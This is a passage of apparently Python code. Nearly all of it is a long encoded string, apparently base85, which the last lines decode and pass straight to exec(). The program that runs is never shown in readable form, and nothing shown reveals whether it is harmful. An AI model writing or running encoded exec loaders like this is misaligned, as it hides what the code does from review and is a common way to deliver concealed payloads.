!=GB5-MAbairNA|P*aAY*TBZe$=mJs=`*X=8LEIt>aSARr(hARr(hARr(hARr(hARr)fWo%|HaA{+7b#i4WbY*ySUt@1=VQyqwFkLAP3JnS%ARr(hARr(hARr(hARr)VW*}p4ZEj>BJv|^IV{K$<B03EUARr(hARr(hARr(hARr(hARr(hb7gF1E@N$EX()7McywQ5Z*5_2WLq#@DGdq@3LqdLARr(hARr(hARr(hAZcbGV{dJ4WFS2~AR=RJWN#um4GJJ2ARr(hARr(hARr(hARr(hARu#PY-TQFZDemKbY*ySUt@1=VQyqwFkLAP3JnS%ARr(hARr(hARr(hARr)VW*}p4ZEj>BJv|^Ic4=f~Zz3RXav)=GZEj>BJv|^Ic4=f~A|P*aAY*TBZe$=mJs=`>X=EZg4GJJ2ARr(hARr(hARr(hARr(hARu#PY-TQYX=G(@D0F3bbYEj{ZDDR?TQFTI4GIkkARr(hARr(hARr(hARr(hX=Wf}Z*6X5AU!=GB4v1KbRr;cav)=GZEj>BJv|^IV{CIGAa8OYV{dJ4WFS2~AR=RIWnpq6It>aSARr(hARr(hARr(hARr(hARr)fWo%|HWq4_Hb0{ed3JnS%ARr(hARr(hARr(hARr)VW*}p4ZEj>BJv|^IY;R+0A|P*aAY*TBZe$=mJs=`uY;SXAB03EUARr(hARr(hARr(hARr(hARr(hb7gF1E@NzOb7gZVDGdq@3LqdLARr(hARr(hARr(hAZcbGV{dJ4WFS2~AR=pJd14|UZ*m}GZ*6X5AU!=GB5P%NVsBw`WFk5Z3LqdLARr(hARr(hARr(hARr(hAaiAGW-e=Gd15GZWq5R7V{dI?Ze&|9T`3I;4GJJ2ARr(hARr(hARr(hARuXGAY*TBZe$=mJs=`-VRLIDAa8OYV{dJ4WFS2~AR=sGd2e-eB03EUARr(hARr(hARr(hARr(hARr(hb7gF1E^=XWYbYrV3JnS%ARr(hARr(hARr(hARr)VW*}p4ZEj>BJv|^IWNC6DAa8OYV{dJ4WFS2~AR=UGa%E$5X>V>KIt>aSARr(hARr(hARr(hARr(hARr)fWo%|HWNC6`V{|BVWq5R7V{dI?Ze&|9T`3I;4GJJ2ARr(hARr(hARr(hARuXGAY*TBZe$=mJs=`%Z)YMp4GJJ2ARr(hARr(hARr(hARr(hARu#PY-TQOZ)az7D0F3bbYEj{ZDDR?TQFTI4GIkkARr(hARr(hARr(hARr(hX=Wf}Z*6X5AU!=GB6DMMWo2%2Xm4~PAa8OYV{dJ4WFS2~AR=>Pa&96z4GJJ2ARr(hARr(hARr(hARr(hARu#PY-TQVV{&C>ZgXgFbSNne3JnS%ARr(hARr(hARr(hARr)VW*}p4ZEj>BJv|^IX>M?IA|P*aAY*TBZe$=mJs=`!Zg6#UB03EUARr(hARr(hARr(hARr(hARr(hbYXI5Wpp4tAaiAGW-e)NaCLNFXLV^PbY*ySUt@1=VQyqwFkLAP3JnS%ARr(hARr(hARr(hARr)VW*}p4ZEj>BJv|^IZ*_EVA|P*aAY*TBZe$=mJs=`)b#!obbRs$p3LqdLARr(hARr(hARr(hARr(hAaiAGW-f4YX>N31XLV^PbY*ySUt@1=VQyqwFkLAP3JnS%ARr(hARr(hARr(hARr)VW*}p4ZEj>BJv|^Ib97;HbRr;cav)=GZEj>BJv|^Ib98caB03EUARr(hARr(hARr(hARr(hARr(hb7gF1E^~BYa&%v2X>4UEbY*ySUt@1=VQyqwFkLAP3JnS%ARr(hARr(hARr(hARr)VW*}p4ZEj>BJv|^IWMpr1A|P*aAY*TBZe$=mJs=`sbaY{3YhPw>aw0kn3LqdLARr(hARr(hARr(hARr(hAaiAGW-er8Z*wSgWq5R7V{dI?Ze&|9T`3I;4GJJ2ARr(hARr(hARr(hARuXGAY*TBZe$=mJs=`ta&LEYWpW}QZ*m}GZ*6X5AU!=GB4ToPb0Rto3LqdLARr(hARr(hARr(hARr(hAaiAGW-elKZ+CNLawv3VcywQ5Z*5_2WLq#@DGdq@3LqdLARr(hARr(hARr(hAZcbGV{dJ4WFS2~AR=&eY-}PRZ*m}GZ*6X5AU!=GB5-wVY+q(+Y-J)k4GJJ2ARr(hARr(hARr(hARr(hARu#PY-TQSb!=>3W@&6?D0F3bbYEj{ZDDR?TQFTI4GIkkARr(hARr(hARr(hARr(hX=Wf}Z*6X5AU!=GB6n$KX(AwRav)=GZEj>BJv|^IWq5RQVPkY(cWGv6UvOb_b9ZlYWOE`q4GJJ2ARr(hARr(hARr(hARr(hARu#PY-TQHcyw}MV{~74X=Z6(aA9+EcW-iJb0{ed3JnS%ARr(hARr(hARr(hARr)VW*}p4ZEj>BJv|^IbYXLAY-w|JA|P*aAY*TBZe$=mJs=`<VRLIDIt>aSARr(hARr(hARr(hARr(hARr)fWo%|HbYXLAY-w|JD0F3bbYEj{ZDDR?TQFTI4GIkkARr(hARr(hARr(hARr(hX=Wf}Z*6X5AU!=GB4TrIWFk5Z3LqdLARr(hARr(hARr(hARr(hAaiAGW-elLZ)7Mb4GIkkARr(hARr(hARr(hARr(hX=Wf}Z*6X5AU!=GB5P@EY$7@h3LqdLARr(hARr(hARr(hARr(hAaiAGW-euTX>@ZaDGdrBARr(hARr(hARr(hARr(hARr)OZ*(qmbZ>B9aBpmEX>MmIDGdq@3LqdLARr(hARr(hARr(hAZcbGV{dJ4WFS2~AR={eWFk5Z3LqdLARr(hARr(hARr(hARr(hAaiAGW-fJbWMOn=Ut(``C@BpJARr(hARr(hWq4y{aCABi3LqdLARr(hARr(hAY~vuAR^G7(TLEv(6P|E(6AuTvLMj1(6!LC(UH)-(7n*U(77Pcy3oGRywI@Fz0kDKwIU4)ARr(hARr(hARr(hY;R|0WpXZTZ)YfTWo%|Ha$$2~X?8AOUv6P-WnW(`AY~~H3LqdLARr(hARr(hAYyNHE^}pWWM6G%b8}&5WhirHY-TQLWGo<NC(xeJh|svuvCz8EusR@nWql_p4GIkk4GLy;Zew3zaA_btAVzg=V_!i~Nhm1|3JnSk3P56SbS`aWb8}&5WnXAvZe(m_awubOZEaz0WOF@RCuweGZzn7uCv$XRa&#wMDGdr_Wo96AbYXIIUu|V`b75y?C~akPb75y?DLM@bARr(hX=Wg8Wpi_3XJsy9Xkm0NX=EU2ZXju7It>aSARr(hARr)OZ*(qmWo~3&ZDn(FVP|D1ZDn(FVP|D7V`yP?E@@;e4GJJ2ARr(hARr(hARr(hARr(hARr(hARr)SCwopoO+{Z&Qcp)xK}~%ic6(MuQd3D!PJLW%PGN0jIv{&QVRT_GZeeX@eOzwPq0qn3xY2>ozR<cL(S*^1(7n*Q(T32t(78GwXmoUNb2=|CXK8e3bz&}KZ*4C`ZEs|DM@TPCVPsBabT49TZ(=WPVQFqJQbj>TO+_wkWFjXi4GIkk4GKVFZ*(qgWpi_3XJub#VQyq>WpXHEZ*FvDZggLCd2nTOJzFPqWq5QaT`3I;WMyU`X>Mk3YiVa<C~akPb75y?DLM@bARr(hX=Wg8Wpi_3XJsy9Xkm0NX=EU2ZXju7It>aSARr(hARr)Sb#7x{VQ^_KaAk64Z*nMYWpi_3XJsyQWq5QfAZ=xHb75y?E@Nn6bS`ORDGdq@3JnTCVsCUVZDn(FVP|DuXkl(-Y-MsNV{dMBWo~p|ba`-Pb3I!paA<FIZzo+T4GLssW*}%`Ze(m_Uu17%b6;d{V|8t1ZgePZWpi_3XJsim4GJJ2ARuXGAZ=xHb75y?E@Nn6bS`ORAZczOX=FML3LqdLARr(hAZBT7WnXD-W^W)pAYyNHE@x$QUuJ1+WhiZBb8}&5WiD`NZ**^4Y-MgJZDn(FVP|D7aA<FIZz&)xATeDoW@&6?Uuk414GJJ2ARr(hARuIKcW!KNVPs`wUuJ1+WgtBuVsCUVWN&wFY;R#?UuJ1+WhiE8Y-L|*Zf0*TW@&6?UvOb`XekW}ARr(hARr(hb8=%KJs@pmWNBevaA9<4AS)nkWpi_3XJsyMXm50HTQOZOW@&6?Uuk3w3LqdLARr(hAa`kWXdrKJWo{^Qa$_tYCwF2eDIj5UAZ}%MUuJ1+WjYNCARr(hARr(hARr(hZe@30W@&6?E_ZTibY&=HZ+C8NZ((F*WM5`!Y-K483LqdLARr(hAaH48bs#+;W_503Utw@*E^=jVC~akPb75y?E^ugXbZ=WRT`p#6Y-L|*WGo;eaA{*ADGdrBARr(hARr)OZ*(qlWpHeHUvzIMZDn(FVP|D5AZ8*@OD-VLq0qk3h0%b}u+Y8GxX`;G(7MpD(7GUdaA{+8eOzuLDGdq@3JnTCVsCUVZDn(FVP|DuXkl(-Y-MsNV{dMBWo~p|ba`-Pb3I!pc4=f~Zzo+T4GLssW*}!}bYEs^Y-K2IWpi_3XJsim4GJJ2ARuXGAZ=xHb75y?E@Nn6bS`ORAZczOX=FML3LqdLARr(hAaHVNZgePZWpi_3XJsyGb8l`b4GJJ2ARr(hARuOGY-L|=VQpm~Js@pmWNBevaA9<4AS)nkWpi_3XJsyGb8l{2Cw6IMWp5{4TPJ2|Y-L|*WG7t>3LqdLARr(hAZBT7WnXD-W^W)pAYyNHE@x$QUuJ1+WhiZBb8}&5WiEDUWMywIW@&6?Uuk414GJJ2ARr(hARu>XbZ8)NaAj^NW@&6?Uv6P-Wh@{fcVZ$bAYpSLW;zWDARr(hARr(hARr(hW@&6?Ut@1>bY*UIAUz;rZ*(qXZ+C8NZ((F#W@&6?C}wGFWnXD-W^XQLX>4U*aA9<4DGdrBARr(hARr(hARr)SE_ZTibY&=JX>4U*V{dMBWo~pS4GJJ2ARr(hARu;WWMyw4Js@UvZew3zaA_`bWo{^DX>4U*ZeeX@TQxdeEFdCwX=EZP4GJJ2ARr(hARuCIbS`pbaBO*BbZ;naWpi_3XJsrPW+G2ZE+EjM(7w@y(SXpf(7n*O(7Pbey3nxDx*&FGWMyw6DGdq@3JnTCVsCUVZDn(FVP|DuXkl(-Y-MsNV{dMBWo~p|ba`-Pb3I!pWN%}2ZDnqBCtWEG3S?zwAZTH3WNc+$W@&6?C~akPb75y?DLM@bARr(hX=Wg8Wpi_3XJsy9Xkm0NX=EU2ZXju7It>aSARr(hARr)ga(Oxp3LqdLARr(hARr(hAZBT7WnXD-W^W)pAYyNHE@x$QUuJ1+WhiZBb8}&5WiDiIV|8t1ZgehYX>4U*X=Eu43LqdLARr(hARr(hAY^ZMZftL1WMyPuW@&6?AUz;rZ*(qXZ+C8NZ((F#W@&6?C}wGFWnXD-W^XQLX>4U*aA9<4DGdrBARr(hARr(hARr)fa$_JpAZ=x2X<=V*VRUF9D<ExUb8}&5WiDiIV|8t1ZgehYX>4U*ZeeX@4GJJ2ARr(hARr(hARu>XbZ8)NaAj^Nb8=%WASZWXCn+Fdb0BVIcVA{{Y-KtP3LqdLARr(hARr(hARr(hAZ}%MUuJ1+WiEGeX>?^MWN&wFY;R#?Wn^DwX>4UF4GJJ2ARr(hARr(hARuCIbS`pbaBO*BbZ;naWpi_3XJsrPBG9AJfzZFuwb6*sz0kfQDGdrBARr(hARr)Rcw=R7bRb1|V`Xr3X>V>IVRIm5It>aSARr(hARr(hARr)YZ)ay^axQFdXDBCaWpi_3XJub#VQyq>WpZC+Z(}DcAY~~H3LqdLARr(hARr(hAYyNHE^=jXY<XXFZzyeLb8}&5Wh@|OBG8`Eh|svuvCz8EusR@nWql$k4GIkk4GLm!bS`ObW@&C|ba`KJZ)|L7Zf7VdARr?k(6`XA(7(}x(SgvqAkl%)y3nxDz0kPPfY83sve2;5z0kPPk08*!(7w>J(TmZAAkl%)zR<qVvC)apwa~rLxX`&E(7w@vAkl)*vkeL').decode('utf8')
exec(source)
        